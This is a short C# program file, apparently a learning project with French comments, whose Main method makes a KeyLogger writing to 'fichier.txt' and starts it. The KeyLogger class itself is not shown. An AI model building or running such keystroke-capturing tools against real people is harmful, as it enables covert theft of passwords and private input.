using System;

namespace testc_
{ 
    class Program

    {
      

        static void Main(string[] args)
        {
            
            //appelle de la class pour definir le chemin du fichier
            KeyLogger keyLogger = new KeyLogger("fichier.txt");
            //appele de la methode de la fonction keyLogger 
            keyLogger.StaticMethod();
        }
    }
}





